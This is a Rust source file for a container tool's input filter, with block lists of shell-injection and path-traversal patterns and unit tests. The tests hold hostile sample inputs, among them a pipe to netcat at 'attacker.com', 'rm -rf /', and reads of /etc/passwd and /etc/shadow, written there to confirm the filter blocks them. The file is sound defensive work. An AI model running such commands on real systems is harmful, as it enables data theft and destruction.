//! # Input Filter — MELISA Security Guard
//!
//! Validates and sanitises raw user input before it reaches [`execute_command`].
//! Rules are applied in priority order; the first violation short-circuits the
//! rest and returns a structured [`BlockReason`] for user-facing output.
//!
//! ## Design notes
//!
//! * **Shell pass-through commands** (`--send`) intentionally forward arguments
//!   to a remote container shell.  They bypass the injection rule so that
//!   legitimate payloads such as `apt update && apt upgrade -y` are not
//!   rejected.  Those commands are responsible for their own argument escaping
//!   at the SSH boundary.
//!
//! * **Directory navigation** (`cd`) is executed locally in the REPL process
//!   via [`std::env::set_current_dir`].  It bypasses injection checks but keeps
//!   path-traversal checks so that `cd ../../../../etc` is still blocked.
//!
//! * All other commands are subject to the full set of rules.

use std::fmt;

// ── Tuneable thresholds ───────────────────────────────────────────────────────

/// Maximum accepted length for a single command line (bytes / UTF-8 chars).
/// Commands longer than this are almost certainly malformed or attack payloads.
const MAX_INPUT_LEN: usize = 1_024;

/// Null-byte character.  Never a valid part of a MELISA command token.
const NULL_BYTE: char = '\0';

/// Shell metacharacter sequences that must not appear in non-passthrough input.
///
/// The list deliberately avoids blocking `-` and `_` which are common in
/// container names and package identifiers.
const SHELL_INJECTION_PATTERNS: &[&str] = &[
    "$(",   // subshell substitution
    "`",    // backtick substitution
    "${",   // variable expansion
    "&&",   // logical AND chain
    "||",   // logical OR chain
    ";",    // statement separator
    "\n",   // newline injection
    "\r",   // carriage-return injection
    ">",    // output redirection
    "<",    // input redirection
    "|",    // pipe
];

/// Filesystem traversal sequences that must never appear in any argument,
/// regardless of the command being issued.
const PATH_TRAVERSAL_PATTERNS: &[&str] = &[
    "../",   // POSIX parent-directory traversal
    "..\\",  // Windows parent-directory traversal
    "..%2f", // URL-encoded POSIX traversal
    "..%5c", // URL-encoded Windows traversal
];

// ── Public API ────────────────────────────────────────────────────────────────

/// Outcome produced by [`filter_input`].
///
/// The `Allow` variant grants the caller permission to forward the input to
/// the command executor.  The `Block` variant carries a structured reason
/// suitable for display to the end user.
#[derive(Debug, PartialEq, Eq)]
pub enum FilterResult {
    /// Input passed all validation rules and is safe to execute.
    Allow,
    /// Input was rejected.  The inner value explains why.
    Block(BlockReason),
}

/// Structured explanation attached to every [`FilterResult::Block`] outcome.
#[derive(Debug, PartialEq, Eq)]
pub enum BlockReason {
    /// The input string exceeds [`MAX_INPUT_LEN`] characters.
    TooLong { length: usize, limit: usize },
    /// A null byte was detected inside the input.
    NullByte,
    /// A known shell-injection pattern was found.
    ShellInjection { pattern: String },
    /// A known path-traversal sequence was found.
    PathTraversal { pattern: String },
}

impl fmt::Display for BlockReason {
    fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {
        match self {
            Self::TooLong { length, limit } => write!(
                f,
                "Input length {length} exceeds the maximum permitted limit of {limit} characters.",
            ),
            Self::NullByte => write!(
                f,
                "Input contains a null byte (\\0), which is never valid in a MELISA command.",
            ),
            Self::ShellInjection { pattern } => write!(
                f,
                "Blocked: shell-injection sequence '{pattern}' detected in input.",
            ),
            Self::PathTraversal { pattern } => write!(
                f,
                "Blocked: path-traversal sequence '{pattern}' detected in input.",
            ),
        }
    }
}

/// Validates `raw_input` against every active security rule.
///
/// Returns [`FilterResult::Allow`] when all rules pass, or
/// [`FilterResult::Block`] with a [`BlockReason`] on the first violation.
///
/// # Examples
///
/// ```rust
/// use crate::core::guard::{filter_input, FilterResult};
///
/// assert_eq!(filter_input("melisa --list"), FilterResult::Allow);
/// assert!(matches!(
///     filter_input("melisa --stop box; reboot"),
///     FilterResult::Block(_)
/// ));
/// ```
pub fn filter_input(raw_input: &str) -> FilterResult {
    // ── Rule 1: Length guard ─────────────────────────────────────────────────
    if raw_input.len() > MAX_INPUT_LEN {
        return FilterResult::Block(BlockReason::TooLong {
            length: raw_input.len(),
            limit:  MAX_INPUT_LEN,
        });
    }

    // ── Rule 2: Null-byte guard ──────────────────────────────────────────────
    if raw_input.contains(NULL_BYTE) {
        return FilterResult::Block(BlockReason::NullByte);
    }

    // ── Context detection ────────────────────────────────────────────────────
    //
    // Determine how strictly subsequent rules should be applied based on
    // the leading command token.
    let first_token = raw_input.split_whitespace().next().unwrap_or("");

    // `--send` forwards its remaining arguments verbatim to a remote container
    // shell via `lxc-attach`.  Injection checks would block legitimate payloads
    // such as `apt update && apt upgrade -y`.  The SSH/LXC layer is responsible
    // for its own escaping at that boundary.
    let is_shell_passthrough = first_token == "--send";

    // `cd` is executed locally by the REPL; its argument is a filesystem path.
    // Injection checks do not apply, but path-traversal checks remain active.
    let is_cd = first_token == "cd";

    // ── Rule 3: Shell-injection guard ────────────────────────────────────────
    if !is_shell_passthrough && !is_cd {
        let lower = raw_input.to_lowercase();
        for &pattern in SHELL_INJECTION_PATTERNS {
            if lower.contains(pattern) {
                return FilterResult::Block(BlockReason::ShellInjection {
                    pattern: pattern.to_string(),
                });
            }
        }
    }

    // ── Rule 4: Path-traversal guard (always active) ─────────────────────────
    let lower = raw_input.to_lowercase();
    for &pattern in PATH_TRAVERSAL_PATTERNS {
        if lower.contains(pattern) {
            return FilterResult::Block(BlockReason::PathTraversal {
                pattern: pattern.to_string(),
            });
        }
    }

    FilterResult::Allow
}

// ── Unit tests ────────────────────────────────────────────────────────────────

#[cfg(test)]
mod tests {
    use super::*;

    // ── Allow cases ──────────────────────────────────────────────────────────

    #[test]
    fn test_allow_standard_melisa_command() {
        assert_eq!(
            filter_input("melisa --list"),
            FilterResult::Allow,
            "A well-formed melisa command must pass the filter unchanged"
        );
    }

    #[test]
    fn test_allow_empty_input() {
        assert_eq!(
            filter_input(""),
            FilterResult::Allow,
            "Empty input must not trigger any security rule"
        );
    }

    #[test]
    fn test_allow_whitespace_only_input() {
        assert_eq!(
            filter_input("   "),
            FilterResult::Allow,
            "Whitespace-only input must be allowed through the filter"
        );
    }

    #[test]
    fn test_allow_container_name_with_hyphen() {
        assert_eq!(
            filter_input("melisa --run my-dev-box"),
            FilterResult::Allow,
            "Container names with hyphens must not be blocked by any rule"
        );
    }

    #[test]
    fn test_allow_send_passthrough_with_logical_and() {
        // --send is a declared shell pass-through; injection rules must not apply.
        assert_eq!(
            filter_input("--send mybox apt update && apt upgrade -y"),
            FilterResult::Allow,
            "--send payloads may legitimately contain && and must not be blocked"
        );
    }

    #[test]
    fn test_allow_send_passthrough_with_pipe() {
        assert_eq!(
            filter_input("--send mybox cat /etc/os-release | grep NAME"),
            FilterResult::Allow,
            "--send payloads may legitimately contain pipe characters"
        );
    }

    #[test]
    fn test_allow_cd_with_absolute_path() {
        assert_eq!(
            filter_input("cd /var/log/melisa"),
            FilterResult::Allow,
            "cd with an absolute path must be allowed"
        );
    }

    #[test]
    fn test_allow_cd_single_level_up() {
        // `cd ..` is normal POSIX navigation and must not be blocked.
        // Note: `..` alone does not match `../`, `..\\`, `..%2f`, or `..%5c`.
        assert_eq!(
            filter_input("cd .."),
            FilterResult::Allow,
            "cd .. (single-level up with no trailing slash) must be allowed"
        );
    }

    #[test]
    fn test_allow_input_at_exact_max_length() {
        let input = "a".repeat(MAX_INPUT_LEN);
        assert_eq!(
            filter_input(&input),
            FilterResult::Allow,
            "Input at exactly MAX_INPUT_LEN characters must pass the length rule"
        );
    }

    // ── Block: length ────────────────────────────────────────────────────────

    #[test]
    fn test_block_input_exceeding_max_length() {
        let long_input = "a".repeat(MAX_INPUT_LEN + 1);
        assert!(
            matches!(
                filter_input(&long_input),
                FilterResult::Block(BlockReason::TooLong { .. })
            ),
            "Input exceeding MAX_INPUT_LEN must be blocked with TooLong reason"
        );
    }

    #[test]
    fn test_block_reason_too_long_carries_correct_lengths() {
        let input = "x".repeat(MAX_INPUT_LEN + 50);
        if let FilterResult::Block(BlockReason::TooLong { length, limit }) =
            filter_input(&input)
        {
            assert_eq!(length, MAX_INPUT_LEN + 50, "Reported length must match actual input length");
            assert_eq!(limit, MAX_INPUT_LEN, "Reported limit must match MAX_INPUT_LEN constant");
        } else {
            panic!("Expected TooLong block reason for oversized input");
        }
    }

    // ── Block: null byte ─────────────────────────────────────────────────────

    #[test]
    fn test_block_null_byte_in_command() {
        let input = "melisa\0 --list";
        assert_eq!(
            filter_input(input),
            FilterResult::Block(BlockReason::NullByte),
            "Input containing a null byte must be blocked"
        );
    }

    #[test]
    fn test_block_null_byte_at_end_of_input() {
        let input = "melisa --list\0";
        assert_eq!(
            filter_input(input),
            FilterResult::Block(BlockReason::NullByte),
            "Trailing null byte must be detected and blocked"
        );
    }

    // ── Block: shell injection ───────────────────────────────────────────────

    #[test]
    fn test_block_semicolon_separator_injection() {
        assert!(
            matches!(
                filter_input("melisa --list; rm -rf /"),
                FilterResult::Block(BlockReason::ShellInjection { .. })
            ),
            "Semicolon-separated command injection must be blocked"
        );
    }

    #[test]
    fn test_block_subshell_substitution_injection() {
        assert!(
            matches!(
                filter_input("melisa --run box $(cat /etc/passwd)"),
                FilterResult::Block(BlockReason::ShellInjection { .. })
            ),
            "Subshell $() injection must be blocked"
        );
    }

    #[test]
    fn test_block_backtick_substitution_injection() {
        assert!(
            matches!(
                filter_input("melisa --run box `id`"),
                FilterResult::Block(BlockReason::ShellInjection { .. })
            ),
            "Backtick substitution injection must be blocked"
        );
    }

    #[test]
    fn test_block_double_ampersand_injection() {
        assert!(
            matches!(
                filter_input("melisa --stop box && reboot"),
                FilterResult::Block(BlockReason::ShellInjection { .. })
            ),
            "&& chained command injection must be blocked"
        );
    }

    #[test]
    fn test_block_logical_or_injection() {
        assert!(
            matches!(
                filter_input("melisa --stop ghost || echo owned"),
                FilterResult::Block(BlockReason::ShellInjection { .. })
            ),
            "|| chained command injection must be blocked"
        );
    }

    #[test]
    fn test_block_pipe_injection() {
        assert!(
            matches!(
                filter_input("melisa --list | nc attacker.com 4444"),
                FilterResult::Block(BlockReason::ShellInjection { .. })
            ),
            "Pipe injection must be blocked"
        );
    }

    #[test]
    fn test_block_output_redirection_injection() {
        assert!(
            matches!(
                filter_input("melisa --list > /etc/cron.d/evil"),
                FilterResult::Block(BlockReason::ShellInjection { .. })
            ),
            "Output redirection injection must be blocked"
        );
    }

    #[test]
    fn test_block_variable_expansion_injection() {
        assert!(
            matches!(
                filter_input("melisa --run box ${IFS}cat${IFS}/etc/shadow"),
                FilterResult::Block(BlockReason::ShellInjection { .. })
            ),
            "Variable-expansion injection must be blocked"
        );
    }

    #[test]
    fn test_block_newline_injection() {
        let input = "melisa --list\nrm -rf /";
        assert!(
            matches!(
                filter_input(input),
                FilterResult::Block(BlockReason::ShellInjection { .. })
            ),
            "Newline-embedded injection must be blocked"
        );
    }

    #[test]
    fn test_block_carriage_return_injection() {
        let input = "melisa --list\rrm -rf /";
        assert!(
            matches!(
                filter_input(input),
                FilterResult::Block(BlockReason::ShellInjection { .. })
            ),
            "Carriage-return injection must be blocked"
        );
    }

    // ── Block: path traversal ────────────────────────────────────────────────

    #[test]
    fn test_block_posix_path_traversal_in_upload() {
        assert!(
            matches!(
                filter_input("melisa --upload box ../../../etc/passwd /tmp"),
                FilterResult::Block(BlockReason::PathTraversal { .. })
            ),
            "POSIX path-traversal in --upload argument must be blocked"
        );
    }

    #[test]
    fn test_block_windows_path_traversal_in_upload() {
        assert!(
            matches!(
                filter_input("melisa --upload box ..\\..\\Windows\\System32 /tmp"),
                FilterResult::Block(BlockReason::PathTraversal { .. })
            ),
            "Windows-style path-traversal must be blocked"
        );
    }

    #[test]
    fn test_block_url_encoded_path_traversal() {
        assert!(
            matches!(
                filter_input("melisa --upload box ..%2f..%2fetc%2fpasswd /tmp"),
                FilterResult::Block(BlockReason::PathTraversal { .. })
            ),
            "URL-encoded path-traversal must be blocked"
        );
    }

    #[test]
    fn test_block_cd_with_deep_path_traversal() {
        // cd bypasses injection rules but path-traversal is always checked.
        assert!(
            matches!(
                filter_input("cd ../../../etc"),
                FilterResult::Block(BlockReason::PathTraversal { .. })
            ),
            "cd with multi-level path traversal must be blocked"
        );
    }

    #[test]
    fn test_block_send_passthrough_with_path_traversal() {
        // Even shell pass-through commands must not be allowed to traverse paths.
        assert!(
            matches!(
                filter_input("--send box cat ../../../etc/shadow"),
                FilterResult::Block(BlockReason::PathTraversal { .. })
            ),
            "Path-traversal inside --send arguments must still be blocked"
        );
    }

    // ── Display formatting ───────────────────────────────────────────────────

    #[test]
    fn test_block_reason_display_too_long_is_informative() {
        let reason = BlockReason::TooLong { length: 1025, limit: 1024 };
        let msg = reason.to_string();
        assert!(msg.contains("1025"), "Display must include the actual input length");
        assert!(msg.contains("1024"), "Display must include the configured limit");
    }

    #[test]
    fn test_block_reason_display_shell_injection_includes_pattern() {
        let reason = BlockReason::ShellInjection { pattern: ";".to_string() };
        let msg = reason.to_string();
        assert!(msg.contains(';'), "Display must include the offending pattern");
    }

    #[test]
    fn test_block_reason_display_path_traversal_includes_pattern() {
        let reason = BlockReason::PathTraversal { pattern: "../".to_string() };
        let msg = reason.to_string();
        assert!(msg.contains("../"), "Display must include the offending pattern");
    }
}